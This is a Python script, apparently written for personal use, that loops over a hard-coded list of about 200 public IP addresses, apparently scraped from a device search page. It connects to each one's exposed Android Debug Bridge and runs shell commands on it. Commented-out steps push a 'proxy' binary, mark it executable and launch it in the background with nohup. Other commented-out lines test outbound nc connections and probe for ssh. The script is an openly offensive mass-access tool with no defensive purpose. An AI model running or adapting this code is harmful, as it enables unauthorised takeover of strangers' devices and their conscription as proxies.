# prompt('ctrl+c, enter',JSON.stringify([...document.querySelector("body > div.container.u-full-width.card.card-padding > div > div.nine.columns").children].filter(e=>e.className=='result').map(e=>e.children[1].innerText)))
ips =  ["199.126.183.127","124.255.238.115","85.227.81.169","122.234.1.111","112.234.185.89","110.89.8.85","69.167.31.242","110.10.211.65","36.48.37.129","124.255.237.191"]
ips += ["85.227.81.169","84.238.113.3","5.103.60.215","109.59.55.114"]
ips += ["124.255.238.42","124.255.230.1","124.255.253.185","124.255.230.28","124.255.238.113","124.255.237.194"]
ips += ["69.167.31.242","131.212.125.74","174.64.31.159","24.189.171.63","169.229.139.197","137.119.190.159","173.28.250.101","216.128.147.128","128.90.106.149","160.223.223.74"]
ips += ["110.10.211.65"]
ips += ["199.126.183.127","124.255.238.115","85.227.81.169","122.234.1.111","112.234.185.89","110.89.8.85","69.167.31.242","110.10.211.65","36.48.37.129","124.255.237.191"]
ips += ["200.35.221.178","45.120.203.168","151.252.171.50","24.66.18.93","152.249.64.72","123.161.222.42","112.118.71.40","1.64.3.128","176.37.215.120","45.219.38.173"]
ips += ["200.35.221.178","201.209.125.175","186.92.6.219","186.93.126.150","201.211.149.57","190.74.124.192","186.91.5.10","190.206.99.145","38.222.51.242","38.166.62.138"]
ips += ["200.109.10.199","190.204.139.171","201.208.221.109","186.89.229.91","190.207.225.139","201.242.172.221","190.200.145.21","190.207.153.83","201.248.211.96","186.91.141.171"]
ips += ["45.120.203.168"]
ips += ["151.252.171.50"]
ips += ["24.66.18.93"]
ips += ["123.161.222.42","1.196.248.22","115.57.161.216","123.7.117.99","123.7.117.72","123.161.222.238","171.11.98.187","125.43.65.48","61.52.151.193","123.4.255.51"]
ips += ["112.118.71.40","1.64.3.128","219.73.96.81","223.19.211.52","221.127.152.169","218.250.91.58","168.70.19.134","221.127.29.19","119.236.28.58","223.16.75.114"]
ips += ["45.219.38.173","45.219.27.255","160.167.12.217","154.148.78.111","105.188.20.211","196.69.254.30","160.173.213.241","196.69.176.34","196.126.2.28","196.67.191.15"]
ips += ["78.130.55.157","79.22.136.112","1.36.190.240","93.90.76.234","223.19.105.245","81.198.200.133","83.82.117.159","116.148.245.139","218.103.248.199","93.177.214.235"]
ips += ["160.173.237.3","5.150.213.145","93.90.76.145","112.119.202.192","113.199.90.15","223.241.60.234","109.123.36.243","119.237.45.179","77.120.220.247","84.224.19.89"]
ips += ["211.251.13.206","59.12.169.43","112.185.203.51","61.83.187.230","112.173.159.196","218.152.227.118","218.147.96.68","14.47.213.217","221.163.54.78","220.73.62.168"]
ips += ["121.181.164.130","222.112.172.119","121.136.91.193","221.161.144.180","210.91.177.81","59.12.169.92","175.199.237.55","14.47.213.116","121.185.158.85","119.194.16.73"]
ips += ["1.36.190.240","112.119.202.192","119.237.45.179","42.98.152.236","218.250.200.154","203.218.131.191","219.73.21.61","42.3.89.243","219.77.152.173","112.118.89.6"]
ips += ["112.118.101.7","116.49.110.1","112.118.110.95","58.153.151.114","112.118.162.2","119.237.9.241","116.48.111.129","112.118.111.237","112.118.102.203","119.237.74.87"]
ips += ["50.82.117.94","99.119.3.40","198.154.99.4","173.29.188.192","153.33.230.117","169.237.31.243","70.118.247.8","205.134.224.169","162.201.130.99","104.145.124.220"]
ips += ["153.141.169.12","116.80.32.99","124.255.238.43","124.255.238.42","124.255.238.114","202.238.150.197","157.101.166.72","157.101.166.69","49.111.255.237","153.141.169.105"]
ips = list(set(ips))
# import subprocess

# def run_command(*command):
#     p = subprocess.Popen(command)
#     try:
#         p.wait(4)
#     except subprocess.TimeoutExpired:
#         p.kill()
#         return -1
#     return p.returncode
    

# for ip in ips:
#     try:
#         run_command('adb', 'connect', ip)
#         run_command('adb', '-s', ip, 'shell', 'ssh', '-v')
#     except:
#         pass
#     finally:
#         run_command('adb', 'disconnect', ip)


import asyncio
import shlex
import os.path
import random

import timeout


async def run(*command, input=None, **s):
    try:
        process = await asyncio.subprocess.create_subprocess_exec(*command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, stdin=asyncio.subprocess.PIPE)
        stdout, stderr = await timeout.run_with_timeout(process.communicate(input=input), 2)
        return process.returncode, stdout, stderr
    finally:
        del process

async def adb_connection(ip):
    try:
        a=await run('adb', 'connect', ip)
        if not a[1].startswith(b'connected to ') and not a[1].startswith(b'already connected to '):
            return
    except asyncio.TimeoutError:
        return
    self = yield
    res = lambda *a, **s: self.asend([a,s])
    while 1:
        command,s = yield res
        s: dict
        mode = s.get('_mode', 'exec')
        if mode == None:
            res = await run('adb', '-s', ip, *command, **s)
            continue
        if mode == 'exec':
            command = shlex.join(command)
        res = await run('adb', '-s', ip, 'shell', command, **s)

async def adb_shell(ip):
    connection = adb_connection(ip)
    try:
        await connection.asend(None)
        return await connection.asend(connection)
    except StopAsyncIteration:
        return None

l = asyncio.Lock()

async def process_one_ip(ip):
    await asyncio.sleep(random.random())
    async with l:
        shell = await adb_shell(ip)
        if not shell:
            return
        print(f'__ connected to {ip}')
        try:
            # a=await shell('pwd')
            # print(a, ip)
            a=(await shell('mktemp'))
            print(a)
            # if not a[1] or a[1][0]!=b'/' or b' ' in a[1] or b':' in a[1]:
            #     return
            # filename = a[1].strip()
            # print(ip, a, filename)
            # a=await shell('push', 'proxy',filename, _mode=None)
            # print(ip, a)
            # a=await shell('chmod', '+x', filename)
            # print(ip, a)
            # a=await shell(f'cd {os.path.dirname(filename)}; (nohup {filename} &); echo $!')
            # print(ip, a)
        except asyncio.TimeoutError:
            pass
    # if a[2].startswith('ls:'):
    #     print(ip)


    # await shell('')
    # a = await shell('nc', 'twitter.com', '80', input=b'GET / HTTP/1.1\r\n\r\n')
    # print(ip, a)

    # await connection.asend(None)
    # await connection.asend(['nc', 'twitter.com'])



    # a=await run('adb', 'connect', ip)
    # if not a[1].startswith(b'connected to '):
    #     return
    # 'adb', '-s', ip, 'shell',
    #     a=await run('adb', '-s', ip, 'shell', 'nc twitter.com 80', input=b'GET / HTTP/1.1\r\n\r\n')
    # print(a)
    # print(ip)
    # a=await run('adb', '-s', ip, 'shell', 'ssh', '-V')
    # if b'Dropbear' in a[1] or b'SSH' in a[1]:
    #     print(ip)

async def main():
    try:
        await asyncio.gather(*map(process_one_ip, ips))
    finally:
        await asyncio.sleep(0.1)

asyncio.run(main())

